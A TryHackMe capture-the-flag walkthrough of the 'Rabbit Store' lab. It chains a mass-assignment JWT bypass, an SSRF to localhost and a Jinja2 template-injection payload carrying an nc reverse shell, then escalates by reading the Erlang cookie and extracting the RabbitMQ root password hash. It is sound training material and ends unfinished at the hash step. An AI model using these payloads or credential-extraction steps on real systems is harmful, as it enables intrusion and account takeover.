# 🧠 TryHackMe Room: Rabbit Store

**Room URL:** [https://tryhackme.com/room/rabbitstore](https://tryhackme.com/room/rabbitstore)  
**Author:** Schenkee  
**Profile:** [https://tryhackme.com/p/schenkee](https://tryhackme.com/p/schenkee)  

---

## 🧩 Overview  

**Objective:**  This guide walks through solving the Rabbit Store room. This challenge involves multiple rounds of web enumeration. The exploitation of three different web vulnerability to gain initial access to the host system. Once initial access has been gained privilege escalation is achieved via enumerating a RabbitMQ instance.

---

## 🧰 Tools I Used  
- RustScan  
- nmap  
- dirsearch  
- ffuf  
- Caido  
- rabbitmqctl

Durning this challenge I experimented with a couple of different tools I have not used before being dirsearch and Caido. Dirsearch is another directory brute force tool like Gobuster and Caido is a Burp Suite alternative. It is always good to have hands-on experience with multiple tools even if they serve the same purpose.  

---

Firstly, let’s start our target machine and give it a few minutes to start all relevant services. The room author reccomands to use a personal machine connected via VPN to tackle this challange, rather than the AttackBox. For this room I would also highly reccomand adding `rabbitstore.thm` to your `/etc/hosts` file as there will be multiple further domains that need to be accessed via the same IP address later in the room.

---

## 🛠️ Recon & Enumeration 

As always I started out with some simple port and directory scans against the target.  

RustScan as below.  
```bash
rustscan -a rabbitstore.thm -- -A
```
#### ⚙️ **Options**   
**-a** Use to list the IPs, CIDRs or hosts to be scanned.  
**-A** Passes the IP and open ports to nmap to perform a full ```-A``` nmap scan.   
Note that we need to add the double dash ```--``` after the IP to tell RustScan that the following arguments should be passed to nmap. In this instance ```-A```  
![Recon - RustScan](./Images/Recon%20-%20RustScan.png)  

This scan resulted in a few interesting items to add to our initial notes.
```
PORT      STATE SERVICE REASON         VERSION                                
22/tcp    open  ssh     syn-ack ttl 60 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)                                                  
80/tcp    open  http    syn-ack ttl 60 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
4369/tcp  open  epmd    syn-ack ttl 60 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown syn-ack ttl 60
```
Here we can see a few open ports.  
Port 22 `SSH` on testing this was configured via password login. So maybe usable later if we find a credential.  

Port 80 `HTTP` the main interesting item to note here is that visiting `http://rabbitstore.thm` caused a redirect to `http://cloudsite.thm` as such we can add `cloudsite.thm` to our `/etc/hosts` file.  

Port 4369 `epmd` the Erlang Port Mapper Daemon `epmd` is a built-in component that helps Erlang-based applications (including RabbitMQ) discover each other’s distribution ports.

Port 25672 `rabbit` RabbitMQ is an open-source message broker software, also known as message-oriented middleware, that facilitates communication between distributed applications using a message queue model. 

We will come back to `epmd` and `rabbit` later in the challenge once initial access has been achieved. 

Now I ran a dirsearch scan against the newfound redirect address `http://cloudsite.thm` as below
```bash
dirsearch -u http://cloudsite.thm
```
#### ⚙️ **Options**   
**-u** Use to list the IPs, CIDRs or hosts to be scanned.  
Note that dirsearch has a default wordlist that will be used if no specific wordlist is provided. This wordlist is comparable to notable lists in finding directories.  
![Recon - dirsearch-cloud.png](./Images/Recon%20-%20dirsearch-cloud.png)  
This did not return a great deal of useful information.  

Lastly before manually checking the website I ran ffuf to check for Vhosts.
```bash
ffuf -H "Host: FUZZ.cloudsite.thm" -H "User-Agent: Test" -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cloudsite.thm -fc 302
```  
#### ⚙️ **Options**   
**-H** Used to set the `HOST` header. Required discover vhost served by the same IP/URL as provided via `-u`  
**-H** Not strictly needed, but sometimes filtering will require the `User-Agent` header has been set and has a value.   
**-c** Tells ffuf to colourise the output. Makes it easier to see results.  
**-w** Provides the path to the wordlist to use in the `FUZZ` position.  
**-u** Provides the URL to the target.  
**-fc** Used to list HTTP response codes to ignore. In this case `302` as we don't need to see redirects. 
![Recon - ffuf.png](./Images/Recon%20-%20ffuf.png)  

Here we get a nice hit on `storage` and we can now add this to our `/etc/hosts` file as `storage.cloudsite.thm`  

At this stage I navigated to `http://cloudsite.thm` in my browser and looked around the website for clues. Overall it was very uneventful as 99% of content was just placeholder. But there was a login/signup panel, as such I created myself an account and logged in to see what would be returned.  When logging in I was presented with the below message.
![Recon - login error.png](./Images/Recon%20-%20login%20error.png)  

At the URL `http://storage.cloudsite.thm/dashboard/inactive` so my first instinct here was just to change the URL to `http://storage.cloudsite.thm/dashboard/active` and see what this would do. 

Now we got an more helpful error.  
![Recon - Token error.png](./Images/Recon%20-%20Token%20error.png)  
So, it seems we need to have a Cookie/Token set with some specific parameters to allow access to the `http://storage.cloudsite.thm/dashboard/active` portion of the website. 

This for me is where I ended the recon section as we now know the most likely way into the website for initial access.  

---

## 🛠️ Initial Access

### 🔑 Mass Assignment Vulnerability

Here I started Caido, (Burp Suite can be used) to capture our login request and see what is going on.  

Below are the request and response sent to the website when capturing the login request.  
![MAV - inactive login request.png](./Images/MAV%20-%20inactive%20login%20request.png)  
![MAV - inactive login response.png](./Images/MAV%20-%20inactive%20login%20response.png)  
Here we can see the server response with inactive and with a `jwt` cookie.  

There are also a couple of other items to note here. First, we can see the `X-Powered-By` value is Express and we also have a new endpoint `/api/login` which can be added to our notes to check later.  

If we inspect this `jwt` via [www.jwt.io/](www.jwt.io/)  we can see that the subscription value is inactive `"subscription":"inactive"`  
![MAV - JWT.IO - inactive.png](./Images/MAV%20-%20JWT.IO%20-%20inactive.png)  

So here I decided to see if I can register a new account and capture the request in Caido to modify and pass in the argument `"subscription":"active"` in the HTTP request.  
![MAV - active register request.png](./Images/MAV%20-%20active%20register%20request.png)  
![MAV - active register response.png](./Images/MAV%20-%20active%20register%20response.png)  

Note here on another endpoint `/api/register` to add to our notes.  

Success the server accepted our passed in value `"subscription":"active"` and returned us a `jwt` with an active status.  
![MAW - JWT.IO - active.png](./Images/MAV%20-%20JWT.IO%20-%20active.png)

Now when we log into the website, we can see the contents of `http://storage.cloudsite.thm/dashboard/active` which are some file and URL uploaders.  
![MAV - active dashboard.png](./Images/MAV%20-%20active%20dashboard.png)  

Now we have managed to gain access to the website as an active user we can try to locate a way to exploit this to gain further access into the target.  

---

### 🌐 Server-Side Request Forgery (SSRF) Vulnerability

If we remember from the above section, we had located two new endpoints `/api/login` and `/api/register` as such I did another scan on the website with dirsearch for further `/api/` endpoints.  
```bash
dirsearch -u http://storage.cloudsite.thm/api/
```
#### ⚙️ **Options**   
**-u** Use to list the IPs, CIDRs or hosts to be scanned.  
Note that dirsearch has a default wordlist that will be used if no specific wordlist is provided. This wordlist is comparable to notable lists in finding directories.  
![SSRF - dirsearch.png](./Images/SSRF%20-%20ffuf%20scan.png)  
This returned two new interesting locations
```
/api/docs  
/api/uploads
```
Navigating to these two items manually did not yield much. `/api/docs` did return `Access Denied` so this looks like a good point to aim for as there seems to be something there of note we are not able to view currently.  

As such I turned my attention to the `Upload From URL` option to see what happened when I uploaded a file and where it would be stored.  First create a file and then start a Python3 HTTP Server.  
```bash
echo "Hello World" > file.txt
python3 -m http.server 5050
```
Now enter in the URL of your attacking machine and the file location into the upload form. `HTTP://ATTACKER_IP/FILE_PATH`  

Checking the terminal we can see the file was successfully served by our HTTP server and the website confirms the same, along with the files stored location. At this stage I am constantly capturing each HTTP request and response to get a better understanding of the process.  
![SSRF - http server success.png](./Images/SSRF%20-%20http%20server%20success.png)    
![SSRF - test file success.png](./Images/SSRF%20-%20test%20file%20success.png)  

Navigating to the URL of the uploaded file we see the below response and our files content is output.  
![SSRF - view test file caido.png](./Images/SSRF%20-%20view%20test%20file%20caido.png)  

Ok so we can upload a file and navigate to its location to view the contents. What if we can upload the `/api/docs` file from `http://storage.cloudsite.thm/api/docs`?  

![SSRF - test docs request.png](./Images/SSRF%20-%20test%20docs%20request.png)   
![SSRF - test docs response.png](./Images/SSRF%20-%20test%20docs%20response.png)  
Looks promising   
![SSRF - test docs error.png](./Images/SSRF%20-%20test%20docs%20error%20.png)  
Dam all we get is the same `Access denied` message that we received when navigating to `/api/docs` in our browser. 

At this point I thought there should be a way to directory access the file path via the local machine. We know the API server runs on `Express` from earlier recon. When looking up online on I found some information saying files can be accessed via `http://localhost:3000/path` with `3000` being the default port for Express.    

As such I attempted the process again.   
![SSRF - localhost request.png](./Images/SSRF%20-%20localhost%20request.png)   
![SSRF - localhost response.png](./Images/SSRF%20-%20localhost%20response.png)  
Looks promising   
![SSRF - api docs success.png](./Images/SSRF%20-%20api%20docs%20success.png)  
Success, we have access to the contents and here is one new and very interesting item here and that is `/api/fetch_messeges_from_chatbot`  

This wraps up the SSRF vulnerability exploitation and we can now move on to test `/api/fetch_messeges_from_chatbot`  

---

### 🐍 Server-Side Template Injection (SSTI) Vulnerability

The docs file lists the chatbot under the `POST` items. As such we can craft a POST request via Caido and forward this to the endpoint to view the returned response.  

I just grabbed an existing `POST` request from my HTTP History tab and sent it to `Replay`. In Burp Suite you would use `Repeater`  

I modified the `POST` request to adjusted in the below items and initially just sent a blank request.  
```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Cookie: jtw=ACTIVE_JWT_TOKEN_STRING

{
  "":""
}
```
![SSTI - blank test.png](./Images/SSTI%20-%20blank%20test.png)  
This is a good start; we confirmed the request content is valid and that we need to pass in a username.  

Modify the request to add a username as below.  
```http
{
  "username":"test"
}
```
![SSTI - username test.png](./Images/SSTI%20-%20username%20test.png)  
Great we have got a response back and the most interesting part to note here is that our supplied username `test` was reflected in the request.

At this stage I sent some time sending requests with various code snips and polyglots to test for a wide range of web vulnerabilities but had no luck. I spent some time researching online and eventually can across this article [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) this contained the polyglot `${{<%[%'"}}%\` to test for SSTI. I tried this no luck, but noticed it was not being sent correctly as it required some escape characters to, I modified this to `${{<%[%'\"}}%\\.` which worked.   
![SSTI - polyglot.png](./Images/SSTI%20-%20polyglot.png)  

So here we see something called `jinja2`. Time for more research again something I was unfamiliar with. But this time the results came quicker as I could search for `SSTI jinja2 PoC` which returned some very helpful results.

I found some remote code execution examples for jinja2 via the SSTI vulnerability as below
```jinja2
"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
```
The above code will run the command `id` on the target system.  
![SSTI - ID test.png](./Images/SSTI%20-%20ID%20test.png)  

Perfect now we can try to swap the `id` command out for a reverse shell. I swapped in the below code and started a netcat listener on my attacking machine.  

Netcat
```bash
nc -lnvp 9001
```
Reverse shell code
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```
The code to pass in the HTTP request then becomes
```jinja2
"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}{% if b.__class__ == {}.__class__ %}{% if 'eval' in b.keys() %}{{ b['eval']('__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 
TARGET_IP PORT >/tmp/f\").read()') }}{% endif %}{% endif %}{% endfor %}{% endif %}{% endfor %}"
```
![ SSTI - reverse shell payload.png](./Images/SSTI%20-%20reverse%20shell%20payload.png)  

If everything has been entered correctly the web server should hang as normal with a reverse shell and a connection should have been received by netcat.  
![SSTI - netcat start.png](./Images/SSTI%20-%20netcat%20start.png)  

Access to the target has now been successfully achieved and the process to retrieve the flags can start!  

---

## 🛠️ Flag 1 

First let’s check our logged in user.   
```bash
id
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
```

We are logged in as `azrael` which looks to be the basic user on the system. Output the contents on the first flag as below  
```bash
cat /home/azrael/user.txt
```
![Flag1 - flag.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Rabbit_Store/Images/Flag1%20-%20flag.png)

Now time to move onto the root flag.

---

## 🛠️ Flag 2

First let's upgrade our shell via the following commands.
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
azrael@forge:~/chatbotServer$ export TERM=xterm
export TERM=xterm
azrael@forge:~/chatbotServer$ ^Z
zsh: suspended  nc -lnvp 9001

┌──(machonachos㉿kali)-[~]
└─$ stty raw -echo; fg  
[1]  + continued  nc -lnvp 9001

azrael@forge:~/chatbotServer$ id
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
azrael@forge:~/chatbotServer$
```

Now from our initial scans we know there is a service called epmd (Erlang port mapper daemon) on port `4369` and RabbitMQ on port `25672`. Researching online for `empd` vulnerabilities I came across this write-up [Erlang distribution RCE and a cookie bruteforcer](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)  this provided some useful information and the first item to work on is locating the `.erlang.cookie`  

```bash
azrael@forge:/$ find / -type f -name ".erlang.cookie" 2>/dev/null
/var/lib/rabbitmq/.erlang.cookie
azrael@forge:/$ cat /var/lib/rabbitmq/.erlang.cookie
ERLANG_COOKIE
```
![Flag2 - cookie](./Images/FLag2%20-%20cookie.png)  

Now that we have successfully retrieved the cookie we can communicate with `RabbitMQ` and enumerate the service. The command line tool to interact with `RabbitMQ` is `rabbitmqctl`.  

At first, I thought I could do this via the target machine and the `azrael` user. But when I reviewed the output from `rabbitmqctl -h` it mentions this tool must be used via `sudo` or the `rabbitmq` user. But we need to do this from our attacking machine.  

As such we need to add another final item to our `/etc/hosts` file being `forge` as to interact with a `RabbitMQ` instance we need to pass `rabbit@host` and in this case that is `rabbit@forge`  

Once all configured, we can start to enumerate the service. First to confirm our syntax is correct we can do a simple status check.  
```bash
sudo rabbitmqctl --erlang-cookie 'ERLANG_COOKIE' --node rabbit@forge status
```
![Flag2 - rabbitmqctl status.png](./Images/Flag2%20-%20rabbitmqctl%20status.png)  

Now we can list out the active users.
```bash
sudo rabbitmqctl --erlang-cookie 'ERLANG_COOKIE' --node rabbit@forge list_users
```
![Flag2 - rabbitmqctl users.png](./Images/Flag2%20-%20rabbitmqctl%20users.png)  
This returns us a great clue on gaining root access: `The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password.`  

We can now dump out the contents on the `definitions` which along with other items contains the user’s password hash.  
```bash
sudo rabbitmqctl --erlang-cookie 'ERLANG_COOKIE' --node rabbit@forge export_definitions /tmp/rabbit_defs.json
```
![Flag2 - rabbitmqctl get defs.png](./Images/Flag2%20-%20rabbitmqctl%20get%20defs.png)  
This will be saved to the `/tmp` directory on our attacking machine.  

The file can be read using `jq` which is a simple tool for output JSON files in a readable format.  
```bash
jq -c '.users[] | select(.name=="root")' /tmp/rabbit_defs.jso
```
This will output the below.  
```JSON
{"hashing_algorithm":"rabbit_password_hashing_sha256",
"limits":{},
"name":"root",
"password_hash":"USERS_PASSWORD_HASH",
"tags":["administrator"]}
```

Perfect now we have the root user’s password hash. At this stage I attempted to use this to change user on our target machine.
![]()
But this did not work. As such I had a looked at the `RabbitMQ` documentation to understand how it manages credentials. [https://www.rabbitmq.com/docs/passwords](https://www.rabbitmq.com/docs/passwords)  

The documentation explains that a random 32-bit salt is prepended to a user’s password before it is hashed. Once the password and salt have been hashed via SHA-256 the whole string is then base64 encoded. So, we need to remove the salt to gain the true password hash.

This can be done via the following command
```bash
echo -n "USERS_PASSWORD_HASH" | base64 -d | xxd -p -c 100
```
Let's break this down
#### ⚙️ **Options**   
**echo** Echo’s out the USER_PASSWORD_HASH we enter.  
**-n** Prevents a new line for starting after the hash is echoed out.  
**-|** This passes the above echoed out hash to the following base64 tool.  
**base64** Linux command line tool to manage base64 operations.  
**-d** Tells the base64 tool to decode the string we passed in.  
**-|** Takes the decoded base64 string from above and passes it to the xxd tool.  
**xxd**  Linux command line hex dump tool.  
**-p** Tells xxd to output a plain continuous hex string.  
**-c 100** Sets the number of characters per line to 100. If not used the output will be split into two lines.  
![Flag2 - root hash.png](./Images/Flag2%20-%20root%20hash.png)  




---

## 🧠 Takeaways  


---

Thank you for following through my guide of the TryHackMe Rabbit Store room.
